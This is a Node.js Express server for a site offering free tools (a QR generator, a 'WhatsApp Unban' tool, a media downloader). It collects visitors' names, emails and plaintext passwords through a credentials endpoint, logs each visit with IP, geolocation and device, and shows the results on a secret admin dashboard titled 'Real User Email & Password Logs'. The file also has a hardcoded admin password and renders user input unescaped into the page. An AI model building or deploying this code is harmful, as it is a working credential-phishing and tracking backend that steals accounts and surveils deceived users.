const express = require('express');
const path = require('path');
const useragent = require('express-useragent');
const geoip = require('geoip-lite');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(useragent.express());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

let visitorLogs = [];
let ownerMessages = [];
let visitorCredentials = {};
let userReplies = {};
let adminNotices = [];
let appInstallsCount = 0;

function logVisitor(req, pageName) {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    
    let locationStr = "Unknown Location";
    if (ip === '::1' || ip === '127.0.0.1' || ip.startsWith('192.168.')) {
        ip = 'Localhost (You)';
        locationStr = 'Local Network';
    } else {
        let geo = geoip.lookup(ip);
        if (geo) {
            let country = geo.country || '';
            let city = geo.city || '';
            locationStr = `${city ? city + ', ' : ''}${country}`;
        }
    }
    
    let ua = req.useragent;
    let userAgentRaw = req.headers['user-agent'] || 'Unknown Agent';
    let deviceName = `${ua.platform || 'Device'} - ${ua.os || 'OS'} (${ua.browser || 'Browser'})`;
    
    if (!ua.platform && !ua.os && !ua.browser || deviceName.includes('unknown')) {
        deviceName = userAgentRaw;
    }
    
    if (userAgentRaw.includes('SM-A14') || userAgentRaw.includes('Samsung A14')) {
        deviceName = 'Samsung Galaxy A14 (Mobile)';
    }

    let creds = visitorCredentials[ip] || { name: 'Guest', email: 'N/A', password: 'N/A' };

    visitorLogs.unshift({
        time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' }),
        name: creds.name,
        email: creds.email,
        password: creds.password,
        ip: ip,
        location: locationStr,
        device: deviceName,
        action: pageName
    });
}

app.post('/api/track-action', (req, res) => {
    const { action } = req.body;
    if (action) {
        logVisitor(req, action);
    }
    res.json({ success: true });
});

app.post('/api/set-credentials', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    
    const { name, email, password } = req.body;
    if (name && email && password) {
        visitorCredentials[ip] = { name, email, password };
    }
    logVisitor(req, `Logged In with Real Email: ${email}`);
    res.json({ success: true, ip: ip });
});

app.post('/api/track-install', (req, res) => {
    appInstallsCount++;
    logVisitor(req, "Installed Main App to Device 📲");
    res.json({ success: true, count: appInstallsCount });
});

app.post('/api/send-owner-message', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();

    const { username, message } = req.body;
    if (username && message) {
        ownerMessages.unshift({
            id: Date.now(),
            time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' }),
            ip: ip,
            username: username,
            message: message
        });
        logVisitor(req, `Sent Owner Message: "${message.substring(0, 30)}..."`);
    }
    res.json({ success: true });
});

app.get('/api/check-reply', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown IP';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();

    res.json({ reply: userReplies[ip] || null });
});

app.get('/api/get-notices', (req, res) => {
    res.json({ notices: adminNotices });
});

app.get('/', (req, res) => {
    logVisitor(req, 'Visited: Home Page (/)');
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/qr-generator.html', (req, res) => {
    logVisitor(req, 'Visited: QR Generator Tool');
    res.sendFile(path.join(__dirname, 'public', 'qr-generator.html'));
});

app.get('/whatsapp-unban.html', (req, res) => {
    logVisitor(req, 'Visited: WhatsApp Unban Tool');
    res.sendFile(path.join(__dirname, 'public', 'whatsapp-unban.html'));
});

app.get('/password-generator.html', (req, res) => {
    logVisitor(req, 'Visited: Password Generator Tool');
    res.sendFile(path.join(__dirname, 'public', 'password-generator.html'));
});

app.get('/tiktok-downloader.html', (req, res) => {
    logVisitor(req, 'Visited: Media Downloader Tool');
    res.sendFile(path.join(__dirname, 'public', 'tiktok-downloader.html'));
});

app.get('/admin-updates.html', (req, res) => {
    logVisitor(req, 'Visited: Admin Updates Page');
    res.sendFile(path.join(__dirname, 'public', 'admin-updates.html'));
});

app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/admin-stats', (req, res) => {
    const { password, replyText, targetIp, newNotice, mediaData, mediaType, deleteNoticeId } = req.body;
    const ADMIN_PASSWORD = "#chamidu*6767*#";

    if (password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, error: "Unauthorized!" });
    }

    if (deleteNoticeId) {
        adminNotices = adminNotices.filter(n => n.id !== deleteNoticeId);
        return res.json({ success: true, message: "Deleted successfully!" });
    }

    if (newNotice || mediaData) {
        adminNotices.unshift({
            id: Date.now(),
            time: new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' }),
            text: newNotice || '',
            mediaType: mediaType || 'text',
            mediaData: mediaData || null
        });
        return res.json({ success: true, message: "Published successfully!" });
    }

    if (replyText && targetIp) {
        userReplies[targetIp] = replyText;
        return res.json({ success: true, message: "Reply sent!" });
    }

    res.json({
        success: true,
        installs: appInstallsCount,
        logs: visitorLogs,
        messages: ownerMessages,
        notices: adminNotices
    });
});

app.get('/admin-dashboard-secret', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Dilshan Admin Panel</title>
            <link rel="icon" type="image/svg+xml" href="/logo.svg">
            <link rel="manifest" href="/admin-manifest.json">
            <meta name="theme-color" content="#ff0055">
            <style>
                * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
                body { background: #030712; color: #ffffff; padding: 15px; min-height: 100vh; }
                header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #0a4f8a; padding-bottom: 10px; }
                header h1 { color: #00f0ff; font-size: 1.4rem; text-shadow: 0 0 10px #00f0ff; text-transform: uppercase; }
                
                .install-admin-btn { display: none; width: 100%; max-width: 500px; margin: 0 auto 15px auto; padding: 14px; background: linear-gradient(90deg, #ff0055, #ff5500); color: #fff; font-weight: bold; border: none; border-radius: 10px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,85,0.6); font-size: 15px; text-transform: uppercase; }
                
                .install-stat-card { background: #081226; border: 1px solid #00f0ff; border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: center; box-shadow: 0 0 15px rgba(0,240,255,0.2); }
                .install-stat-card h3 { font-size: 14px; color: #8ab4f8; text-transform: uppercase; margin-bottom: 5px; }
                .install-stat-card .count-val { font-size: 2rem; color: #00ffcc; font-weight: bold; text-shadow: 0 0 10px rgba(0,255,204,0.5); }

                .container { max-width: 500px; margin: 0 auto; }
                .login-card { background: #081028; border: 1px solid #00f0ff; padding: 25px; border-radius: 16px; box-shadow: 0 0 20px rgba(0,240,255,0.3); text-align: center; }
                input, textarea, select { width: 100%; padding: 12px; margin: 8px 0; background: #030712; border: 1px solid #00f0ff; color: #fff; border-radius: 8px; font-size: 14px; outline: none; }
                textarea { height: 65px; resize: none; text-align: left; }
                .btn { width: 100%; padding: 14px; background: linear-gradient(90deg, #0072ff, #00f0ff); color: #000; font-weight: bold; border: none; border-radius: 8px; font-size: 15px; cursor: pointer; text-transform: uppercase; }
                
                .dash-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
                .refresh-btn { padding: 8px 16px; background: #00f0ff; color: #000; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; }
                
                .section-title { font-size: 15px; font-weight: bold; margin: 20px 0 10px 0; text-transform: uppercase; }
                
                .notice-publisher { background: #081226; border: 1px solid #00ffcc; border-radius: 12px; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(0,255,204,0.2); }
                .notice-publisher h3 { color: #00ffcc; font-size: 1rem; margin-bottom: 8px; text-transform: uppercase; }

                .admin-post-box { background: #050b18; border: 1px solid #00ffcc; border-radius: 10px; padding: 12px; margin-bottom: 10px; position: relative; }
                .admin-post-box p { font-size: 13px; color: #fff; margin-bottom: 6px; }
                .delete-btn { background: #ff0055; color: #fff; border: none; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: bold; cursor: pointer; }

                .msg-box-admin { background: #1a0814; border: 1px solid #ff0055; border-radius: 12px; padding: 15px; margin-bottom: 12px; position: relative; }
                .msg-box-admin .time-stamp { font-size: 11px; color: #ff88aa; position: absolute; top: 12px; right: 15px; }
                .msg-box-admin .user-tag { font-size: 15px; font-weight: bold; color: #ff0055; margin-bottom: 4px; }
                .msg-box-admin .msg-body { font-size: 14px; color: #fff; background: #080206; padding: 10px; border-radius: 8px; margin: 8px 0; }
                
                .reply-input-group { display: flex; gap: 8px; margin-top: 8px; }
                .reply-input-group input { margin: 0; padding: 8px; font-size: 13px; text-align: left; }
                .reply-input-group button { width: auto; padding: 8px 14px; font-size: 13px; background: #00ffcc; color: #000; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; }

                .visitor-card { background: #081028; border: 1px solid #00f0ff; border-radius: 12px; padding: 15px; margin-bottom: 12px; position: relative; }
                .visitor-card .time-stamp { font-size: 11px; color: #8ab4f8; position: absolute; top: 12px; right: 15px; }
                .visitor-card .name-tag { font-size: 16px; font-weight: bold; color: #00ffcc; margin-bottom: 4px; }
                .visitor-card .ip-tag { font-size: 13px; color: #ff0055; margin-bottom: 6px; }
                .info-row { font-size: 13px; color: #e2e8f0; margin-top: 4px; display: flex; gap: 6px; }
                .info-row span { color: #00f0ff; font-weight: bold; }
                .no-logs { text-align: center; padding: 15px; color: #8ab4f8; font-size: 13px; background: #081028; border-radius: 10px; }
            </style>
        </head>
        <body>
            <header>
                <h1>CHAMIDU'S ADMIN APP</h1>
            </header>

            <div class="container">
                <button id="installAdminAppBtn" class="install-admin-btn" onclick="installAdminApp()">📲 Install Admin App to Phone</button>

                <div id="loginSection" class="login-card">
                    <h3 style="color:#8ab4f8;">Enter Admin Password</h3>
                    <input type="password" id="passInput" placeholder="Password...">
                    <button class="btn" onclick="fetchLogs()">Login to Live Stats</button>
                </div>

                <div id="dashSection" style="display:none;">
                    <div class="dash-header">
                        <span style="font-size:14px; color:#00f0ff;">Live Dashboard (Auto 5s)</span>
                        <button class="refresh-btn" onclick="fetchLogs()">Refresh</button>
                    </div>

                    <div class="install-stat-card">
                        <h3>📲 Total Main App Downloads</h3>
                        <div id="installCountVal" class="count-val">0</div>
                    </div>
                    
                    <div class="notice-publisher">
                        <h3>📤 Publish Media / Update to Site</h3>
                        <select id="mediaType">
                            <option value="text">Text Notice Only</option>
                            <option value="image">Image / Photo</option>
                            <option value="audio">Audio File</option>
                            <option value="video">Video File</option>
                            <option value="file">Document / File</option>
                        </select>
                        <input type="file" id="mediaFile" style="padding:8px; font-size:12px;">
                        <textarea id="noticeInput" placeholder="Type caption or message..."></textarea>
                        <button class="btn" style="padding:10px; font-size:13px; background:linear-gradient(90deg,#00aa77,#00ffcc); color:#000;" onclick="publishMediaNotice()">Publish to Main Site</button>
                    </div>

                    <div class="section-title" style="color:#00ffcc;">📢 Manage Published Posts</div>
                    <div id="adminPostsContainer"></div>

                    <div class="section-title" style="color:#ff0055;">📩 Messages from Users</div>
                    <div id="messagesContainer"></div>

                    <div class="section-title" style="color:#00f0ff;">⚡ Real User Email & Password Logs</div>
                    <div id="visitorCardsContainer"></div>
                </div>
            </div>

            <script>
                if ('serviceWorker' in navigator) navigator.serviceWorker.register('/sw.js');

                let adminDeferredPrompt;
                window.addEventListener('beforeinstallprompt', (e) => {
                    e.preventDefault();
                    adminDeferredPrompt = e;
                    document.getElementById('installAdminAppBtn').style.display = 'block';
                });

                async function installAdminApp() {
                    if (adminDeferredPrompt) {
                        adminDeferredPrompt.prompt();
                        const { outcome } = await adminDeferredPrompt.userChoice;
                        if (outcome === 'accepted') {
                            document.getElementById('installAdminAppBtn').style.display = 'none';
                        }
                        adminDeferredPrompt = null;
                    }
                }

                let savedPassword = '';

                async function fetchLogs() {
                    const inputPass = document.getElementById('passInput').value;
                    if (inputPass) savedPassword = inputPass;

                    try {
                        const res = await fetch('/api/admin-stats', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ password: savedPassword })
                        });
                        const data = await res.json();
                        if (data.success) {
                            document.getElementById('loginSection').style.display = 'none';
                            document.getElementById('dashSection').style.display = 'block';
                            
                            document.getElementById('installCountVal').innerText = data.installs || 0;
                            
                            const postsContainer = document.getElementById('adminPostsContainer');
                            if (!data.notices || data.notices.length === 0) {
                                postsContainer.innerHTML = '<div class="no-logs">No posts published yet.</div>';
                            } else {
                                let pHtml = '';
                                data.notices.forEach(n => {
                                    pHtml += \`
                                        <div class="admin-post-box">
                                            <p><b>[\${n.mediaType.toUpperCase()}]</b> \${n.text || 'Media Post'} (\${n.time})</p>
                                            <button class="delete-btn" onclick="deletePost(\${n.id})">🗑️ Delete Post</button>
                                        </div>
                                    \`;
                                });
                                postsContainer.innerHTML = pHtml;
                            }

                            const msgContainer = document.getElementById('messagesContainer');
                            if (!data.messages || data.messages.length === 0) {
                                msgContainer.innerHTML = '<div class="no-logs">No messages received yet.</div>';
                            } else {
                                let mHtml = '';
                                data.messages.forEach(m => {
                                    mHtml += \`
                                        <div class="msg-box-admin">
                                            <div class="time-stamp">\${m.time}</div>
                                            <div class="user-tag">👤 \${m.username} <span style="font-size:11px; color:#ff88aa;">(IP: \${m.ip})</span></div>
                                            <div class="msg-body">💬 \${m.message}</div>
                                            <div class="reply-input-group">
                                                <input type="text" id="reply_\${m.id}" placeholder="Type reply here...">
                                                <button onclick="sendReply('\${m.ip}', 'reply_\${m.id}')">Send Reply</button>
                                            </div>
                                        </div>
                                    \`;
                                });
                                msgContainer.innerHTML = mHtml;
                            }

                            const container = document.getElementById('visitorCardsContainer');
                            if (data.logs.length === 0) {
                                container.innerHTML = '<div class="no-logs">No user activity recorded yet.</div>';
                            } else {
                                let html = '';
                                data.logs.forEach(log => {
                                    html += \`
                                        <div class="visitor-card">
                                            <div class="time-stamp">\${log.time}</div>
                                            <div class="name-tag">👤 Name: \${log.name}</div>
                                            <div style="font-size:14px; color:#00ffcc; margin-bottom:3px; font-weight:bold;">📧 Email: \${log.email}</div>
                                            <div style="font-size:14px; color:#ff0055; margin-bottom:5px; font-weight:bold;">🔑 Password: \${log.password}</div>
                                            <div class="ip-tag">IP: \${log.ip}</div>
                                            <div class="info-row">📍 <span>Location:</span> \${log.location}</div>
                                            <div class="info-row">📱 <span>Device:</span> \${log.device}</div>
                                            <div class="info-row">⚡ <span>Action:</span> \${log.action}</div>
                                        </div>
                                    \`;
                                });
                                container.innerHTML = html;
                            }
                        } else {
                            alert(data.error);
                        }
                    } catch (e) {
                        alert("Login failed or network error!");
                    }
                }

                function publishMediaNotice() {
                    let type = document.getElementById('mediaType').value;
                    let caption = document.getElementById('noticeInput').value.trim();
                    let fileInput = document.getElementById('mediaFile');

                    if (type !== 'text' && fileInput.files.length === 0) {
                        alert("Please select a file/media to upload!");
                        return;
                    }

                    if (type === 'text' && !caption) {
                        alert("Please type a notice message!");
                        return;
                    }

                    if (type === 'text') {
                        sendDataToServer(type, null, caption);
                        return;
                    }

                    let file = fileInput.files[0];
                    let reader = new FileReader();
                    reader.onload = function(e) {
                        let base64Data = e.target.result;
                        sendDataToServer(type, base64Data, caption);
                    };
                    reader.readAsDataURL(file);
                }

                async function sendDataToServer(mediaType, mediaData, newNotice) {
                    try {
                        let res = await fetch('/api/admin-stats', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ password: savedPassword, newNotice, mediaType, mediaData })
                        });
                        let data = await res.json();
                        if (data.success) {
                            alert("Published successfully to main site!");
                            document.getElementById('noticeInput').value = '';
                            document.getElementById('mediaFile').value = '';
                            fetchLogs();
                        }
                    } catch(e) {
                        alert("Publish failed!");
                    }
                }

                async function deletePost(deleteNoticeId) {
                    if (!confirm("Are you sure you want to delete this post?")) return;

                    try {
                        let res = await fetch('/api/admin-stats', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ password: savedPassword, deleteNoticeId })
                        });
                        let data = await res.json();
                        if (data.success) {
                            alert("Post deleted successfully!");
                            fetchLogs();
                        }
                    } catch(e) {
                        alert("Failed to delete post!");
                    }
                }

                async function sendReply(targetIp, inputId) {
                    let replyText = document.getElementById(inputId).value.trim();
                    if (!replyText) {
                        alert("Please type a reply message!");
                        return;
                    }

                    try {
                        let res = await fetch('/api/admin-stats', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ password: savedPassword, replyText, targetIp })
                        });
                        let data = await res.json();
                        if (data.success) {
                            alert("Reply sent successfully to the user!");
                            document.getElementById(inputId).value = '';
                        }
                    } catch(e) {
                        alert("Failed to send reply!");
                    }
                }

                setInterval(() => {
                    if(document.getElementById('dashSection').style.display === 'block') {
                        fetchLogs();
                    }
                }, 5000);
            </script>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
